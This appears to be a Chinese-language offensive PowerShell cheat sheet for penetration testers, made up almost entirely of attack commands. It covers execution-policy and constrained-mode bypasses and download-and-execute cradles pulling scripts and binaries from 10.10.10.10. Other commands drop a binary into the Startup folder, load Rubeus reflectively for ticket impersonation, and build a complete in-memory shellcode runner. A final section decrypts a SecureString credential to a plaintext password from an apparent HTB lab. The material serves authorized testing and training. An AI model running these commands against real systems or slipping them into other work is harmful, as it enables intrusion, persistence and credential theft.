# PowerShell

## 目录 (Summary)

- [PowerShell](#powershell)
    - [执行策略 (Execution Policy)](#%e6%89%a7%e8%a1%8c%e7%ad%96%e7%95%a5-execution-policy)
    - [编码命令 (Encoded Commands)](#%e7%bc%96%e7%a0%81%e5%91%bd%e4%bb%a4-encoded-commands)
    - [受限模式 (Constrained Mode)](#%e5%8f%97%e9%99%90%e6%a8%a1%e5%bc%8f-constrained-mode)
    - [下载文件 (Download file)](#%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6-download-file)
    - [加载 PowerShell 脚本 (Load Powershell scripts)](#%e5%8a%a0%e8%bd%bd-powershell-%e8%84%9a%e6%9c%ac-load-powershell-scripts)
    - [通过反射加载 C# 程序集 (Load C# assembly reflectively)](#%e9%80%9a%e8%bf%87%e5%8f%8d%e5%b0%84%e5%8a%a0%e8%bd%bd-c-%e7%a8%8b%e5%ba%8f%e9%9b%86-load-c-assembly-reflectively)
    - [使用反射和委托函数调用 Win32 API](#%e4%bd%bf%e7%94%a8%e5%8f%8d%e5%b0%84%e5%92%8c%e5%a7%94%e6%89%98%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8-win-api)
        - [解析函数地址 (Resolve address functions)](#%e8%a7%a3%e6%9e%90%e5%87%bd%e6%95%b0%e5%9c%b0%e5%9d%80-resolve-address-functions)
        - [委托类型反射 (DelegateType Reflection)](#%e5%a7%94%e6%89%98%e7%b1%bb%e5%9e%8b%e5%8f%8d%e5%b0%84-delegatetype-reflection)
        - [示例：简单的 Shellcode 运行器](#%e7%a4%ba%e4%be%8b%e4%bd%bf%e7%94%a8%e7%ae%80%e5%8d%95%e7%9a%84-shellcode-%e8%bf%90%e8%a1%8c%e5%99%a8)
    - [安全字符串转明文 (Secure String to Plaintext)](#%e5%ae%89%e5%85%a8%e5%ad%97%e7%ac%a6%e4%b8%b2%e8%bd%ac%e6%98%8e%e6%96%87-secure-string-to-plaintext)
    - [参考资料 (References)](#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99-references)

## 执行策略 (Execution Policy)

```ps1
powershell -EncodedCommand $encodedCommand
powershell -ep bypass ./PowerView.ps1

# 更改执行策略
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-ExecutionPolicy Bypass -Scope Process
```

## 受限模式 (Constrained Mode)

```ps1
# 检查是否处于受限模式
# 取值可能为：FullLanguage（全语言模式）或 ConstrainedLanguage（受限语言模式）
$ExecutionContext.SessionState.LanguageMode

## 绕过方式 (Bypass)
powershell -version 2
```

## 编码命令 (Encoded Commands)

- Windows

    ```ps1
    $command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    ```

- Linux：:warning: 需要使用 UTF-16LE 编码

    ```ps1
    echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
    ```

## 下载文件 (Download file)

```ps1
# 所有版本通用
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerView.ps1", "C:\Windows\Temp\PowerView.ps1")
wget "http://10.10.10.10/taskkill.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output

# PowerShell 4 及以上版本
IWR "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
```

## 加载 PowerShell 脚本 (Load Powershell scripts)

```ps1
# 具有代理感知功能
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# 不具备代理感知功能
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

## 通过反射加载 C# 程序集 (Load C# assembly reflectively)

```powershell
# 下载并运行不带参数的程序集
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# 下载并运行带参数的 Rubeus（确保对参数进行分割处理）
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# 执行程序集（例如 DLL）中的特定方法
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## 使用反射和委托函数调用 Win32 API

### 解析函数地址 (Resolve address functions)

为了执行反射，我们首先需要获取 `GetModuleHandle` 和 `GetProcAddress`，以便查找到 Win32 API 函数的地址。

为了检索这些函数，我们需要确定它们是否包含在现有的已加程序集 (Assemblies) 中。

```powershell
# 检索所有已加载的程序集 (Assemblies)
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

# 遍历所有程序集，检索所有静态 (Static) 和不安全 (Unsafe) 的方法
$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
```

我们要找到这些程序集的位置，因此使用 `Location` 语句。然后我们将查找程序集 `Microsoft.Win32.UnsafeNativeMethods` 中的所有方法。
注：`GetModuleHandle` 和 `GetProcAddress` 位于 `C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll`。

如果我们想使用这些函数，首先需要获取对该 `.dll` 文件的引用，我们需要该对象的 `GlobalAssemblyCache` 属性已设置（全局程序集缓存本质上是 Windows 上所有原生和已注册程序集的列表，这将允许我们过滤掉非原生程序集）。第二个过滤器是检索 `System.dll`。

```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
})
  
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
```

要检索 `GetModuleHandle` 方法，我们可以使用 `GetMethod(<方法名称>)` 方式。
`$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')`

现在我们可以使用 `$GetModuleHandle` 对象的 `Invoke` 方法来获取对非托管 DLL 的引用。
Invoke 接受两个参数，且均为对象：

- 第一个参数是要在其上调用该方法的对象，但由于我们调用的是静态方法，因此可以将其设为 `$null`。
- 第二个参数是一个数组，由我们调用的方法 (`GetModuleHandle`) 的参数组成。由于 Win32 API 仅接受字符串格式的 DLL 名称，我们只需提供该名称。
`$GetModuleHandle.Invoke($null, @("user32.dll"))`

然而，如果我们想用同样的方法来调用 `GetProcAddress` 函数，它会执行失败，原因是我们检索到的 `System.dll` 对象包含多个 `GetProcAddress` 方法。因此，内部方法 `GetMethod()` 会抛出 `"Ambiguous match found."`（找到多个歧义匹配）的错误。

所以，我们将使用 `GetMethods()` 获取所有可用方法，然后遍历它们仅检索我们需要的一个。

```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
```

如果我们想获取 `GetProcAddress` 的引用，我们将构造一个数组来存储匹配的对象，并使用第一个条目。

```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
```

我们需要选择第一个，因为第二个方法的参数类型与我们的不匹配。

或者，我们可以使用 `GetMethod` 函数并指定我们需要的参数类型。

```powershell
$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',
        [reflection.bindingflags]'Public,Static', 
        $null, 
                             [System.Reflection.CallingConventions]::Any,
                             @([System.IntPtr], [string]), 
                             $null);
```

参考：[https://learn.microsoft.com/zh-cn/dotnet/api/system.type.getmethod?view=net-7.0](https://learn.microsoft.com/zh-cn/dotnet/api/system.type.getmethod?view=net-7.0)

现在，我们已经具备了解析任何所需函数地址的一切条件。

```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

如果我们将所有内容整合到一个函数中：

```powershell
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

### 委托类型反射 (DelegateType Reflection)

为了能够使用我们已获取地址的函数，我们需要将有关参数数量及其相关数据类型的信息与解析出的函数内存地址配对。这是通过 `DelegateType`（委托类型）完成的。
委托类型反射的过程包括在内存中手动创建一个程序集，并向其中填充内容。

第一步是使用 `AssemblyName` 类创建一个新的程序集并为其分配名称。

```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
```

现在我们要为程序集设置权限。我们需要将其设置为可执行状态，且不保存到磁盘。为此将使用 `DefineDynamicAssembly` 方法。

```powershell
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```

一切设置妥当后，我们可以开始在程序集中创建内容。首先，我们需要创建主要构建块，即模块 (Module)。这可以通过 `DefineDynamicModule` 方法完成。
该方法第一个参数需要自定义名称，第二个参数是布尔值，指示我们是否包含符号。

```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```

下一步是创建一个自定义类型，作为我们的委托类型。这可以通过 `DefineType` 方法完成。
参数包括：

- 自定义名称
- 类型的属性 (Attributes)
- 其构建基础的类型

```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
```

接着，我们需要设置函数的原型。
首先我们需要使用 `DefineConstructor` 方法定义构造函数。该方法接受三个参数：

- 构造函数的属性 (Attributes)
- 调用约定 (Calling convention)
- 构造函数的参数类型（即函数原型）

```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public',
                                                        [System.Reflection.CallingConventions]::Standard,
                                                        @([IntPtr], [String], [String], [int]))
```

然后我们需要使用 `SetImplementationFlags` 方法设置一些实现标志。

```powershell
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
```

为了能够调用我们的函数，我们需要在委托类型中定义 `Invoke` 方法。为此，`DefineMethod` 方法允许我们实现此操作。
该方法接受四个参数：

- 定义的方法名称
- 方法属性
- 返回类型
- 参数类型数组

```powershell
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',
                                                'Public, HideBySig, NewSlot, Virtual',
                                                [int],
                                                @([IntPtr], [String], [String], [int]))
```

如果我们将所有内容整合到一个函数中：

```powershell
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # 函数地址
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # 参数类型数组
        [Parameter(Position = 2)] [Type] $retType = [Void] # 返回类型
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
```

### 示例：简单的 Shellcode 运行器

```powershell
# 创建委托函数以调用我们拥有地址的函数
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # 函数地址
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # 参数类型数组
        [Parameter(Position = 2)] [Type] $retType = [Void] # 返回类型
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
# 允许从 DLL 中检索函数地址
function LookupFunc {

 Param ($moduleName, $functionName)

 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# 使用委托机制的简单 Shellcode 运行器
$VirtualAllocAddr = LookupFunc "Kernel32.dll" "VirtualAlloc"
$CreateThreadAddr = LookupFunc "Kernel32.dll" "CreateThread"
$WaitForSingleObjectAddr = LookupFunc "Kernel32.dll" "WaitForSingleObject" 


$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 ...

$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
```

## 安全字符串转明文 (Secure String to Plaintext)

```ps1
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
# 输出结果：
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## 参考资料 (References)

- [Windows & Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)
- [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
